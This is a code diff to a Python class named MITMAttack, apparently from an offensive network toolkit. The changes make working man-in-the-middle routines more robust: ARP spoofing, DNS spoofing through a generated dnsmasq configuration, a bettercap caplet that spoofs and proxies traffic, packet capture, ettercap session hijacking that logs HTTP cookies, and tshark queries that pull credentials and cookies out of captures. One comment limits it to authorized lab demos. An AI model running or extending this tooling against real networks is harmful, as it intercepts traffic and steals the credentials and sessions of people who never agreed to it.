@@ -19,6 +19,8 @@ import subprocess
 import json
 import re
 import shutil
+import shlex
+import uuid
 from typing import Dict, List, Tuple, Optional, Union, Any
 from enum import Enum
 
@@ -87,28 +89,152 @@ class MITMAttack:
         Returns:
             Tuple of (all_installed, missing_tools)
         """
-        if not self.attack_templates or 'attack_types' not in self.attack_templates:
-            return False, ["Attack templates not loaded"]
+        # Built-in fallback requirements if templates are missing or do not include the attack
+        default_requirements: Dict[MITMAttackType, List[str]] = {
+            MITMAttackType.ARP_SPOOF: ["arpspoof", "sysctl"],
+            MITMAttackType.DNS_SPOOF: ["dnsmasq"],
+            MITMAttackType.SSL_STRIP: ["iptables", "sysctl", "bettercap"],
+            MITMAttackType.PACKET_CAPTURE: ["tcpdump", "tshark", "capinfos"],
+            MITMAttackType.SESSION_HIJACK: ["ettercap", "etterfilter"],
+        }
         
-        # Find the attack template
-        attack_template = None
-        for template in self.attack_templates.get('attack_types', []):
-            if template.get('name') == attack_type.value:
-                attack_template = template
-                break
+        requirements: List[str] = []
+        # If templates are available, try to use them first
+        if self.attack_templates and 'attack_types' in self.attack_templates:
+            attack_template = None
+            for template in self.attack_templates.get('attack_types', []):
+                if template.get('name') == attack_type.value:
+                    attack_template = template
+                    break
+            if attack_template:
+                requirements = attack_template.get('requirements', [])
+            else:
+                # Fallback to defaults if template missing
+                logging.warning(f"Attack template not found for {attack_type.value}; using default requirements")
+                requirements = default_requirements.get(attack_type, [])
+        else:
+            # Templates not loaded; fallback to defaults
+            logging.info("Attack templates not loaded; using default requirements")
+            requirements = default_requirements.get(attack_type, [])
         
-        if not attack_template:
-            return False, [f"Attack template not found for {attack_type.value}"]
+        if not requirements:
+            # No way to determine requirements; conservatively fail with an explanation
+            return False, ["Requirements not defined (no templates and no defaults)"]
         
-        # Check requirements
-        requirements = attack_template.get('requirements', [])
-        missing_tools = []
-        
-        for tool in requirements:
-            if shutil.which(tool) is None:
-                missing_tools.append(tool)
-        
+        # Map package names or generic labels to actual executables to test
+        alt_exec_map: Dict[str, List[str]] = {
+            # Packages → representative executables
+            "dsniff": ["arpspoof"],
+            "wireshark": ["wireshark", "tshark", "dumpcap"],
+            "apache2": ["apache2", "httpd"],
+            # Explicit executables (pass through); included for clarity
+            "arpspoof": ["arpspoof"],
+            "dnsmasq": ["dnsmasq"],
+            "iptables": ["iptables"],
+            "tcpdump": ["tcpdump"],
+            "tshark": ["tshark"],
+            "capinfos": ["capinfos"],
+            "ettercap": ["ettercap"],
+            "etterfilter": ["etterfilter"],
+            "sslstrip": ["sslstrip"],
+            "bettercap": ["bettercap"],
+            "hostapd": ["hostapd"],
+            "php": ["php"],
+            "sysctl": ["sysctl"],
+        }
+
+        missing_tools: List[str] = []
+        for req in requirements:
+            candidates = alt_exec_map.get(req, [req])
+            # Consider requirement satisfied if any candidate executable is available
+            found = False
+            for exe in candidates:
+                try:
+                    if shutil.which(exe) is not None:
+                        found = True
+                        break
+                except Exception:
+                    # Continue trying other candidates
+                    pass
+            if not found:
+                # Report in a helpful form
+                if len(candidates) > 1:
+                    missing_tools.append(f"{req} (any of: {', '.join(candidates)})")
+                else:
+                    missing_tools.append(candidates[0])
+
         return len(missing_tools) == 0, missing_tools
+    
+    def _prevent_overlap(self) -> bool:
+        """Return False and log if an attack is already running."""
+        if self.attack_thread and self.attack_thread.is_alive():
+            logging.error("Another MITM attack is already running. Stop it before starting a new one.")
+            return False
+        return True
+    
+    def _require_root(self, operation: str) -> bool:
+        """Ensure the process has root privileges for privileged operations."""
+        try:
+            if os.geteuid() != 0:
+                logging.error(f"{operation} requires root privileges (run as root/sudo).")
+                return False
+        except Exception:
+            # Environments lacking geteuid are treated as permissive
+            pass
+        return True
+
+    def _require_interface(self, operation: str) -> bool:
+        """Ensure the configured network interface exists and is up."""
+        try:
+            iface_path = os.path.join("/sys/class/net", self.interface_name)
+            if not os.path.exists(iface_path):
+                logging.error(f"{operation} requires network interface '{self.interface_name}' which was not found.")
+                return False
+            operstate_path = os.path.join(iface_path, "operstate")
+            state = ""
+            try:
+                with open(operstate_path, "r") as f:
+                    state = f.read().strip()
+            except Exception:
+                state = ""
+            if state and state.lower() != "up":
+                logging.error(f"{operation} requires interface '{self.interface_name}' to be up (current state: '{state}').")
+                return False
+        except Exception as e:
+            logging.error(f"Interface validation failed for {self.interface_name}: {e}")
+            return False
+        return True
+
+    def _terminate_process(self, proc: subprocess.Popen, name: str, timeout: int = 5) -> None:
+        """Terminate a subprocess with escalation to kill if needed."""
+        if not proc:
+            return
+        try:
+            proc.terminate()
+            try:
+                proc.wait(timeout=timeout)
+            except subprocess.TimeoutExpired:
+                logging.warning(f"{name} did not exit gracefully; killing")
+                proc.kill()
+        except Exception as e:
+            logging.debug(f"Error terminating {name}: {e}")
+
+    def _valid_ipv4(self, ip: str) -> bool:
+        try:
+            parts = ip.split('.')
+            if len(parts) != 4:
+                return False
+            for p in parts:
+                v = int(p)
+                if v < 0 or v > 255:
+                    return False
+            return True
+        except Exception:
+            return False
+
+    def _valid_domain(self, domain: str) -> bool:
+        pattern = r"^(?=.{1,253}$)(?!-)(?:[A-Za-z0-9](?:[A-Za-z0-9-]{0,61}[A-Za-z0-9])?\.)+[A-Za-z]{2,}$"
+        return re.match(pattern, domain) is not None
     
     def start_arp_spoof(self, target_ip: str, gateway_ip: str) -> bool:
         """Start ARP spoofing attack.
@@ -120,6 +246,12 @@ class MITMAttack:
         Returns:
             True if attack started successfully, False otherwise
         """
+        if not self._prevent_overlap():
+            return False
+        
+        if not self._require_interface("ARP spoofing"):
+            return False
+        
         # Check requirements
         requirements_met, missing_tools = self.check_requirements(MITMAttackType.ARP_SPOOF)
         if not requirements_met:
@@ -128,10 +260,21 @@ class MITMAttack:
         
         logging.info(f"Starting ARP spoofing attack: target={target_ip}, gateway={gateway_ip}")
         
+        if not self._require_root("ARP spoofing"):
+            return False
+        
+        # Validate inputs
+        if not self._valid_ipv4(target_ip):
+            logging.error(f"Invalid target IP for ARP spoofing: {target_ip}")
+            return False
+        if not self._valid_ipv4(gateway_ip):
+            logging.error(f"Invalid gateway IP for ARP spoofing: {gateway_ip}")
+            return False
+        
         # Enable IP forwarding
         try:
             subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], 
-                         stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
+                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
         except subprocess.CalledProcessError as e:
             logging.error(f"Failed to enable IP forwarding: {e}")
             return False
@@ -143,13 +286,14 @@ class MITMAttack:
         self.attack_thread.start()
         
         # Update attack status
-        self.attack_status = {
-            "type": MITMAttackType.ARP_SPOOF,
-            "status": "running",
-            "start_time": time.time(),
-            "target_ip": target_ip,
-            "gateway_ip": gateway_ip
-        }
+        with self.lock:
+            self.attack_status = {
+                "type": MITMAttackType.ARP_SPOOF,
+                "status": "running",
+                "start_time": time.time(),
+                "target_ip": target_ip,
+                "gateway_ip": gateway_ip
+            }
         
         return True
     
@@ -166,11 +310,11 @@ class MITMAttack:
             
             # Start ARP spoofing
             cmd = ["arpspoof", "-i", self.interface_name, "-t", target_ip, gateway_ip]
-            target_process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            target_process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
             
             # Spoof in the other direction as well
             cmd = ["arpspoof", "-i", self.interface_name, "-t", gateway_ip, target_ip]
-            gateway_process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            gateway_process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
             
             # Wait for stop event
             while not self.stop_event.is_set():
@@ -182,28 +326,32 @@ class MITMAttack:
                     break
             
             # Terminate processes
-            target_process.terminate()
-            gateway_process.terminate()
-            
-            try:
-                target_process.wait(timeout=5)
-                gateway_process.wait(timeout=5)
-            except subprocess.TimeoutExpired:
-                target_process.kill()
-                gateway_process.kill()
+            self._terminate_process(target_process, "arpspoof(target)")
+            self._terminate_process(gateway_process, "arpspoof(gateway)")
             
             # Disable IP forwarding
             subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=0"], 
-                         stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
             
             # Update status
-            self.attack_status["status"] = "stopped"
-            self.attack_status["end_time"] = time.time()
+            with self.lock:
+                self.attack_status["status"] = "stopped"
+                self.attack_status["end_time"] = time.time()
             
         except Exception as e:
             logging.error(f"Error during ARP spoofing attack: {e}")
-            self.attack_status["status"] = "failed"
-            self.attack_status["error"] = str(e)
+            with self.lock:
+                self.attack_status["status"] = "failed"
+                self.attack_status["error"] = str(e)
+                self.attack_status["end_time"] = time.time()
+            # Attempt cleanup on error
+            self._terminate_process(target_process, "arpspoof(target)")
+            self._terminate_process(gateway_process, "arpspoof(gateway)")
+            try:
+                subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=0"], 
+                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            except Exception as ce:
+                logging.warning(f"Cleanup: failed to disable IP forwarding: {ce}")
     
     def start_dns_spoof(self, domain: str, redirect_ip: str) -> bool:
         """Start DNS spoofing attack.
@@ -215,6 +363,12 @@ class MITMAttack:
         Returns:
             True if attack started successfully, False otherwise
         """
+        if not self._prevent_overlap():
+            return False
+        
+        if not self._require_interface("DNS spoofing"):
+            return False
+        
         # Check requirements
         requirements_met, missing_tools = self.check_requirements(MITMAttackType.DNS_SPOOF)
         if not requirements_met:
@@ -223,6 +377,17 @@ class MITMAttack:
         
         logging.info(f"Starting DNS spoofing attack: domain={domain}, redirect_ip={redirect_ip}")
         
+        if not self._require_root("DNS spoofing"):
+            return False
+        
+        # Validate inputs
+        if not self._valid_domain(domain):
+            logging.error(f"Invalid domain for DNS spoofing: {domain}")
+            return False
+        if not self._valid_ipv4(redirect_ip):
+            logging.error(f"Invalid redirect IP for DNS spoofing: {redirect_ip}")
+            return False
+        
         # Create a thread for the attack
         self.attack_thread = threading.Thread(target=self._run_dns_spoof, 
                                              args=(domain, redirect_ip))
@@ -230,13 +395,14 @@ class MITMAttack:
         self.attack_thread.start()
         
         # Update attack status
-        self.attack_status = {
-            "type": MITMAttackType.DNS_SPOOF,
-            "status": "running",
-            "start_time": time.time(),
-            "domain": domain,
-            "redirect_ip": redirect_ip
-        }
+        with self.lock:
+            self.attack_status = {
+                "type": MITMAttackType.DNS_SPOOF,
+                "status": "running",
+                "start_time": time.time(),
+                "domain": domain,
+                "redirect_ip": redirect_ip
+            }
         
         return True
     
@@ -253,6 +419,7 @@ class MITMAttack:
             
             # Create dnsmasq configuration
             config_file = os.path.join(self.capture_dir, "dnsmasq.conf")
+            pid_file = os.path.join(self.capture_dir, "dnsmasq.pid")
             with open(config_file, 'w') as f:
                 f.write(f"address=/{domain}/{redirect_ip}\n")
                 f.write(f"interface={self.interface_name}\n")
@@ -263,8 +430,8 @@ class MITMAttack:
                 f.write(f"log-facility={os.path.join(self.capture_dir, 'dnsmasq.log')}\n")
             
             # Start dnsmasq
-            cmd = ["dnsmasq", "-C", config_file, "-d"]
-            dns_process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            cmd = ["dnsmasq", "-C", config_file, "-d", "--bind-interfaces", "-x", pid_file]
+            dns_process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
             
             # Wait for stop event
             while not self.stop_event.is_set():
@@ -276,25 +443,33 @@ class MITMAttack:
                     break
             
             # Terminate process
-            dns_process.terminate()
-            
-            try:
-                dns_process.wait(timeout=5)
-            except subprocess.TimeoutExpired:
-                dns_process.kill()
+            self._terminate_process(dns_process, "dnsmasq")
             
             # Clean up
             if os.path.exists(config_file):
                 os.remove(config_file)
+            if 'pid_file' in locals() and os.path.exists(pid_file):
+                os.remove(pid_file)
             
             # Update status
-            self.attack_status["status"] = "stopped"
-            self.attack_status["end_time"] = time.time()
+            with self.lock:
+                self.attack_status["status"] = "stopped"
+                self.attack_status["end_time"] = time.time()
             
         except Exception as e:
             logging.error(f"Error during DNS spoofing attack: {e}")
-            self.attack_status["status"] = "failed"
-            self.attack_status["error"] = str(e)
+            with self.lock:
+                self.attack_status["status"] = "failed"
+                self.attack_status["error"] = str(e)
+                self.attack_status["end_time"] = time.time()
+            self._terminate_process(dns_process, "dnsmasq")
+            try:
+                if os.path.exists(config_file):
+                    os.remove(config_file)
+                if 'pid_file' in locals() and os.path.exists(pid_file):
+                    os.remove(pid_file)
+            except Exception as ce:
+                logging.warning(f"Cleanup: failed to remove dnsmasq files: {ce}")
     
     def start_ssl_strip(self, port: int = 10000) -> bool:
         """Start SSL stripping attack.
@@ -305,6 +480,12 @@ class MITMAttack:
         Returns:
             True if attack started successfully, False otherwise
         """
+        if not self._prevent_overlap():
+            return False
+        
+        if not self._require_interface("SSL stripping"):
+            return False
+        
         # Check requirements
         requirements_met, missing_tools = self.check_requirements(MITMAttackType.SSL_STRIP)
         if not requirements_met:
@@ -313,10 +494,23 @@ class MITMAttack:
         
         logging.info(f"Starting SSL stripping attack on port {port}")
         
+        if not self._require_root("SSL stripping"):
+            return False
+        
+        # Validate inputs
+        try:
+            p = int(port)
+        except Exception:
+            logging.error(f"Invalid port (not an integer) for SSL stripping: {port}")
+            return False
+        if p < 1 or p > 65535:
+            logging.error(f"Invalid port (out of range 1-65535) for SSL stripping: {port}")
+            return False
+        
         # Enable IP forwarding
         try:
             subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], 
-                         stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
+                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
         except subprocess.CalledProcessError as e:
             logging.error(f"Failed to enable IP forwarding: {e}")
             return False
@@ -328,70 +522,87 @@ class MITMAttack:
         self.attack_thread.start()
         
         # Update attack status
-        self.attack_status = {
-            "type": MITMAttackType.SSL_STRIP,
-            "status": "running",
-            "start_time": time.time(),
-            "port": port
-        }
+        with self.lock:
+            self.attack_status = {
+                "type": MITMAttackType.SSL_STRIP,
+                "status": "running",
+                "start_time": time.time(),
+                "port": port
+            }
         
         return True
     
     def _run_ssl_strip(self, port: int) -> None:
-        """Run SSL stripping attack in a background thread.
+        """Run bettercap-based MITM (replacement for deprecated sslstrip).
         
         Args:
-            port: Port to listen on
+            port: Unused; kept for backward compatibility
         """
         try:
             # Reset stop event
             self.stop_event.clear()
-            
-            # Set up iptables to redirect traffic
-            subprocess.run(["iptables", "-t", "nat", "-A", "PREROUTING", "-p", "tcp", "--destination-port", "80", 
-                          "-j", "REDIRECT", "--to-port", str(port)], 
-                         stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-            
-            # Start sslstrip
-            log_file = os.path.join(self.capture_dir, f"sslstrip_{time.strftime('%Y%m%d-%H%M%S')}.log")
-            cmd = ["sslstrip", "-l", str(port), "-w", log_file]
-            ssl_process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-            
+
+            # Prepare bettercap caplet and logs
+            timestamp = time.strftime('%Y%m%d-%H%M%S')
+            log_file = os.path.join(self.capture_dir, f"bettercap_{timestamp}.log")
+            caplet_file = os.path.join(self.capture_dir, f"bettercap_{timestamp}.cap")
+
+            # Caplet content: ARP spoof (full duplex), enable events stream to a log, enable HTTP proxy
+            # Note: HSTS prevents real "ssl stripping" on modern sites; this is for authorized lab demos only.
+            caplet = f"""
+set net.sniff.verbose true
+set events.stream.output {log_file}
+events.stream on
+net.probe on
+set arp.spoof.internal true
+set arp.spoof.fullduplex true
+arp.spoof on
+http.proxy on
+"""
+            with open(caplet_file, 'w') as f:
+                f.write(caplet)
+
+            # Enable IP forwarding (bettercap may also handle this)
+            subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
+            # Launch bettercap
+            cmd = ["bettercap", "-iface", self.interface_name, "-caplet", caplet_file]
+            bc_process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
             # Wait for stop event
             while not self.stop_event.is_set():
                 time.sleep(1)
-                
-                # Check if process is still running
-                if ssl_process.poll() is not None:
-                    logging.error("SSL stripping process terminated unexpectedly")
+                if bc_process.poll() is not None:
+                    logging.error("bettercap process terminated unexpectedly")
                     break
-            
-            # Terminate process
-            ssl_process.terminate()
-            
-            try:
-                ssl_process.wait(timeout=5)
-            except subprocess.TimeoutExpired:
-                ssl_process.kill()
-            
-            # Clean up iptables rules
-            subprocess.run(["iptables", "-t", "nat", "-D", "PREROUTING", "-p", "tcp", "--destination-port", "80", 
-                          "-j", "REDIRECT", "--to-port", str(port)], 
-                         stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-            
+
+            # Terminate bettercap
+            self._terminate_process(bc_process, "bettercap")
+
             # Disable IP forwarding
-            subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=0"], 
-                         stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-            
+            subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=0"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
             # Update status
-            self.attack_status["status"] = "stopped"
-            self.attack_status["end_time"] = time.time()
-            self.attack_status["log_file"] = log_file
-            
+            with self.lock:
+                self.attack_status["status"] = "stopped"
+                self.attack_status["end_time"] = time.time()
+                self.attack_status["log_file"] = log_file
+                self.attack_status["caplet_file"] = caplet_file
+
         except Exception as e:
-            logging.error(f"Error during SSL stripping attack: {e}")
-            self.attack_status["status"] = "failed"
-            self.attack_status["error"] = str(e)
+            logging.error(f"Error during bettercap MITM: {e}")
+            with self.lock:
+                self.attack_status["status"] = "failed"
+                self.attack_status["error"] = str(e)
+                self.attack_status["end_time"] = time.time()
+            try:
+                self._terminate_process(bc_process, "bettercap")
+            except Exception:
+                pass
+            try:
+                subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=0"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            except Exception as ce:
+                logging.warning(f"Cleanup: failed to disable IP forwarding: {ce}")
     
     def start_packet_capture(self, filter_expr: str = "", duration: int = 300) -> bool:
         """Start packet capture.
@@ -403,6 +614,12 @@ class MITMAttack:
         Returns:
             True if capture started successfully, False otherwise
         """
+        if not self._prevent_overlap():
+            return False
+        
+        if not self._require_interface("Packet capture"):
+            return False
+        
         # Check requirements
         requirements_met, missing_tools = self.check_requirements(MITMAttackType.PACKET_CAPTURE)
         if not requirements_met:
@@ -411,6 +628,19 @@ class MITMAttack:
         
         logging.info(f"Starting packet capture: filter='{filter_expr}', duration={duration}s")
         
+        if not self._require_root("Packet capture"):
+            return False
+        
+        # Validate inputs
+        try:
+            d = int(duration)
+        except Exception:
+            logging.error(f"Invalid duration (not an integer) for packet capture: {duration}")
+            return False
+        if d <= 0:
+            logging.error(f"Invalid duration (must be > 0) for packet capture: {duration}")
+            return False
+        
         # Create a thread for the capture
         self.attack_thread = threading.Thread(target=self._run_packet_capture, 
                                              args=(filter_expr, duration))
@@ -418,13 +648,14 @@ class MITMAttack:
         self.attack_thread.start()
         
         # Update attack status
-        self.attack_status = {
-            "type": MITMAttackType.PACKET_CAPTURE,
-            "status": "running",
-            "start_time": time.time(),
-            "filter": filter_expr,
-            "duration": duration
-        }
+        with self.lock:
+            self.attack_status = {
+                "type": MITMAttackType.PACKET_CAPTURE,
+                "status": "running",
+                "start_time": time.time(),
+                "filter": filter_expr,
+                "duration": duration
+            }
         
         return True
     
@@ -446,10 +677,13 @@ class MITMAttack:
             # Build tcpdump command
             cmd = ["tcpdump", "-i", self.interface_name, "-w", pcap_file]
             if filter_expr:
-                cmd.extend([filter_expr])
+                try:
+                    cmd.extend(shlex.split(filter_expr))
+                except Exception:
+                    cmd.append(filter_expr)
             
             # Start tcpdump
-            capture_process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            capture_process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
             
             # Wait for duration or stop event
             start_time = time.time()
@@ -462,12 +696,7 @@ class MITMAttack:
                     break
             
             # Terminate process
-            capture_process.terminate()
-            
-            try:
-                capture_process.wait(timeout=5)
-            except subprocess.TimeoutExpired:
-                capture_process.kill()
+            self._terminate_process(capture_process, "tcpdump")
             
             # Generate summary
             summary_file = os.path.join(self.analysis_dir, f"capture_summary_{timestamp}.txt")
@@ -480,15 +709,18 @@ class MITMAttack:
                 summary_process = subprocess.run(cmd, stdout=f, stderr=subprocess.PIPE)
             
             # Update status
-            self.attack_status["status"] = "completed"
-            self.attack_status["end_time"] = time.time()
-            self.attack_status["pcap_file"] = pcap_file
-            self.attack_status["summary_file"] = summary_file
+            with self.lock:
+                self.attack_status["status"] = "completed"
+                self.attack_status["end_time"] = time.time()
+                self.attack_status["pcap_file"] = pcap_file
+                self.attack_status["summary_file"] = summary_file
             
         except Exception as e:
             logging.error(f"Error during packet capture: {e}")
-            self.attack_status["status"] = "failed"
-            self.attack_status["error"] = str(e)
+            with self.lock:
+                self.attack_status["status"] = "failed"
+                self.attack_status["error"] = str(e)
+                self.attack_status["end_time"] = time.time()
     
     def start_session_hijack(self, target_ip: str) -> bool:
         """Start session hijacking attack.
@@ -499,6 +731,12 @@ class MITMAttack:
         Returns:
             True if attack started successfully, False otherwise
         """
+        if not self._prevent_overlap():
+            return False
+        
+        if not self._require_interface("Session hijacking"):
+            return False
+        
         # Check requirements
         requirements_met, missing_tools = self.check_requirements(MITMAttackType.SESSION_HIJACK)
         if not requirements_met:
@@ -507,6 +745,14 @@ class MITMAttack:
         
         logging.info(f"Starting session hijacking attack: target={target_ip}")
         
+        if not self._require_root("Session hijacking"):
+            return False
+        
+        # Validate inputs
+        if not self._valid_ipv4(target_ip):
+            logging.error(f"Invalid target IP for session hijacking: {target_ip}")
+            return False
+        
         # Create a thread for the attack
         self.attack_thread = threading.Thread(target=self._run_session_hijack, 
                                              args=(target_ip,))
@@ -514,12 +760,13 @@ class MITMAttack:
         self.attack_thread.start()
         
         # Update attack status
-        self.attack_status = {
-            "type": MITMAttackType.SESSION_HIJACK,
-            "status": "running",
-            "start_time": time.time(),
-            "target_ip": target_ip
-        }
+        with self.lock:
+            self.attack_status = {
+                "type": MITMAttackType.SESSION_HIJACK,
+                "status": "running",
+                "start_time": time.time(),
+                "target_ip": target_ip
+            }
         
         return True
     
@@ -535,20 +782,21 @@ class MITMAttack:
             
             # Create ettercap filter for cookie capture
             filter_file = os.path.join(self.payload_dir, "cookie_filter.ef")
+            cookie_tmp = os.path.join("/tmp", f"cookies_{uuid.uuid4().hex}.log")
             with open(filter_file, 'w') as f:
                 f.write('if (ip.proto == TCP && tcp.dst == 80) {\n')
                 f.write('  if (search(DATA.data, "Cookie")) {\n')
-                f.write('    log(DATA.data, "/tmp/cookies.log");\n')
+                f.write(f'    log(DATA.data, "{cookie_tmp}");\n')
                 f.write('  }\n')
                 f.write('}\n')
             
             # Compile the filter
             subprocess.run(["etterfilter", filter_file, "-o", f"{filter_file}.cf"], 
-                         stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
             
             # Start ettercap
             cmd = ["ettercap", "-T", "-q", "-F", f"{filter_file}.cf", "-M", "arp", "/"+target_ip+"/", "//"]
-            ettercap_process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            ettercap_process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
             
             # Wait for stop event
             while not self.stop_event.is_set():
@@ -560,34 +808,45 @@ class MITMAttack:
                     break
                 
                 # Check for captured cookies
-                if os.path.exists("/tmp/cookies.log"):
+                if os.path.exists(cookie_tmp):
                     # Copy to our capture directory
                     cookie_file = os.path.join(self.capture_dir, f"cookies_{time.strftime('%Y%m%d-%H%M%S')}.log")
-                    shutil.copy("/tmp/cookies.log", cookie_file)
-                    self.attack_status["cookie_file"] = cookie_file
+                    shutil.copy(cookie_tmp, cookie_file)
+                    with self.lock:
+                        self.attack_status["cookie_file"] = cookie_file
             
             # Terminate process
-            ettercap_process.terminate()
-            
-            try:
-                ettercap_process.wait(timeout=5)
-            except subprocess.TimeoutExpired:
-                ettercap_process.kill()
+            self._terminate_process(ettercap_process, "ettercap")
             
             # Clean up
             if os.path.exists(filter_file):
                 os.remove(filter_file)
             if os.path.exists(f"{filter_file}.cf"):
                 os.remove(f"{filter_file}.cf")
+            if 'cookie_tmp' in locals() and os.path.exists(cookie_tmp):
+                os.remove(cookie_tmp)
             
             # Update status
-            self.attack_status["status"] = "stopped"
-            self.attack_status["end_time"] = time.time()
+            with self.lock:
+                self.attack_status["status"] = "stopped"
+                self.attack_status["end_time"] = time.time()
             
         except Exception as e:
             logging.error(f"Error during session hijacking attack: {e}")
-            self.attack_status["status"] = "failed"
-            self.attack_status["error"] = str(e)
+            with self.lock:
+                self.attack_status["status"] = "failed"
+                self.attack_status["error"] = str(e)
+                self.attack_status["end_time"] = time.time()
+            self._terminate_process(ettercap_process, "ettercap")
+            try:
+                if os.path.exists(filter_file):
+                    os.remove(filter_file)
+                if os.path.exists(f"{filter_file}.cf"):
+                    os.remove(f"{filter_file}.cf")
+                if 'cookie_tmp' in locals() and os.path.exists(cookie_tmp):
+                    os.remove(cookie_tmp)
+            except Exception as ce:
+                logging.warning(f"Cleanup: failed to remove session hijack artifacts: {ce}")
     
     def stop_attack(self) -> None:
         """Stop the current attack."""
@@ -599,14 +858,17 @@ class MITMAttack:
             self.attack_thread.join(timeout=5)
         
         # Clean up based on attack type
-        if self.attack_status.get("type") == MITMAttackType.ARP_SPOOF:
+        with self.lock:
+            atk_type = self.attack_status.get("type")
+            port = self.attack_status.get("port", 10000)
+        if atk_type == MITMAttackType.ARP_SPOOF:
             # Disable IP forwarding
             subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=0"], 
                          stdout=subprocess.PIPE, stderr=subprocess.PIPE)
         
-        elif self.attack_status.get("type") == MITMAttackType.SSL_STRIP:
+        elif atk_type == MITMAttackType.SSL_STRIP:
             # Clean up iptables rules
-            port = self.attack_status.get("port", 10000)
+            # Using captured port from snapshot above
             subprocess.run(["iptables", "-t", "nat", "-D", "PREROUTING", "-p", "tcp", "--destination-port", "80", 
                           "-j", "REDIRECT", "--to-port", str(port)], 
                          stdout=subprocess.PIPE, stderr=subprocess.PIPE)
@@ -616,8 +878,9 @@ class MITMAttack:
                          stdout=subprocess.PIPE, stderr=subprocess.PIPE)
         
         # Update status
-        self.attack_status["status"] = "stopped"
-        self.attack_status["end_time"] = time.time()
+        with self.lock:
+            self.attack_status["status"] = "stopped"
+            self.attack_status["end_time"] = time.time()
     
     def analyze_capture(self, pcap_file: str) -> Dict[str, Any]:
         """Analyze a packet capture file.
@@ -632,6 +895,11 @@ class MITMAttack:
             logging.error(f"PCAP file not found: {pcap_file}")
             return {"error": "PCAP file not found"}
         
+        # Ensure required analysis tools are available
+        missing_tools = [t for t in ('capinfos', 'tshark') if shutil.which(t) is None]
+        if missing_tools:
+            return {"error": f"Required analysis tools not found: {', '.join(missing_tools)}"}
+        
         analysis = {
             "file": pcap_file,
             "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
@@ -645,7 +913,7 @@ class MITMAttack:
         try:
             # Get basic statistics
             cmd = ["capinfos", pcap_file]
-            process = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            process = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
             output = process.stdout.decode('utf-8', errors='ignore')
             
             # Parse statistics
@@ -656,7 +924,7 @@ class MITMAttack:
             
             # Get protocol statistics
             cmd = ["tshark", "-r", pcap_file, "-q", "-z", "io,phs"]
-            process = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            process = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
             output = process.stdout.decode('utf-8', errors='ignore')
             
             # Parse protocol statistics
@@ -679,7 +947,7 @@ class MITMAttack:
             
             # Get host statistics
             cmd = ["tshark", "-r", pcap_file, "-q", "-z", "endpoints,ip"]
-            process = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            process = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
             output = process.stdout.decode('utf-8', errors='ignore')
             
             # Parse host statistics
@@ -706,7 +974,7 @@ class MITMAttack:
             # Look for credentials
             cmd = ["tshark", "-r", pcap_file, "-Y", "http.request.method == POST", "-T", "fields", 
                   "-e", "http.host", "-e", "http.request.uri", "-e", "http.file_data"]
-            process = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            process = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
             output = process.stdout.decode('utf-8', errors='ignore')
             
             # Parse potential credentials
@@ -728,7 +996,7 @@ class MITMAttack:
             # Look for cookies
             cmd = ["tshark", "-r", pcap_file, "-Y", "http.cookie", "-T", "fields", 
                   "-e", "http.host", "-e", "http.cookie"]
-            process = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            process = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
             output = process.stdout.decode('utf-8', errors='ignore')
             
             # Parse cookies
